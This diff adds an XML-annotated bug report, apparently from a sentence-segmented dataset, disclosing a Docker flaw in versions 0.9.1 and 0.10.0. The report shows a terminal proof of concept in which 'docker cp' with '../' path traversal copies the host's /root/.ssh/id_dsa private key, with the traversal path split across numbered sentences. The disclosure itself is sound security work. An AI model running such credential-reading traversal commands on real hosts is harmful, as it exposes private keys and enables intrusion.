@@ -1,0 +1,56 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<bug>
+	<id>5656</id>
+	<title>Access to docker daemon gives unrestricted read access to host filesystem</title>
+	<description>
+		<paragraph id="1">
+			<sentence id="1.1">Kind of under the same umbrella, access to talk to the docker damon allows access to the entire host filesystem:</sentence>
+		</paragraph>
+		<paragraph id="2">
+			<sentence id="2.1">```
+&#x25CB; &#x2192; ls id_dsa
+ls: cannot access id_dsa: No such file or directory</sentence>
+		</paragraph>
+		<paragraph id="3">
+			<sentence id="3.1">&#x25CB; &#x2192; docker.io cp 2227e2a5bd3f:.</sentence>
+			<sentence id="3.2">.</sentence>
+			<sentence id="3.3">/.</sentence>
+			<sentence id="3.4">.</sentence>
+			<sentence id="3.5">/.</sentence>
+			<sentence id="3.6">.</sentence>
+			<sentence id="3.7">/.</sentence>
+			<sentence id="3.8">.</sentence>
+			<sentence id="3.9">/.</sentence>
+			<sentence id="3.10">.</sentence>
+			<sentence id="3.11">/.</sentence>
+			<sentence id="3.12">.</sentence>
+			<sentence id="3.13">/.</sentence>
+			<sentence id="3.14">.</sentence>
+			<sentence id="3.15">/.</sentence>
+			<sentence id="3.16">.</sentence>
+			<sentence id="3.17">/.</sentence>
+			<sentence id="3.18">.</sentence>
+			<sentence id="3.19">/.</sentence>
+			<sentence id="3.20">.</sentence>
+			<sentence id="3.21">/.</sentence>
+			<sentence id="3.22">.</sentence>
+			<sentence id="3.23">/.</sentence>
+			<sentence id="3.24">.</sentence>
+			<sentence id="3.25">/root/.</sentence>
+			<sentence id="3.26">ssh/id_dsa .</sentence>
+			<sentence id="3.27">2014/05/07 11:28:23 lchown id_dsa: operation not permitted</sentence>
+		</paragraph>
+		<paragraph id="4">
+			<sentence id="4.1">&#x25CB; &#x2192; ls id_dsa
+id_dsa</sentence>
+		</paragraph>
+		<paragraph id="5">
+			<sentence id="5.1">&#x25CB; &#x2192; cat id_dsa 
+SECRET_KEY!</sentence>
+			<sentence id="5.2">```</sentence>
+		</paragraph>
+		<paragraph id="6">
+			<sentence id="6.1">Tested with docker 0.9.1 and 0.10.0</sentence>
+		</paragraph>
+	</description>
+</bug>
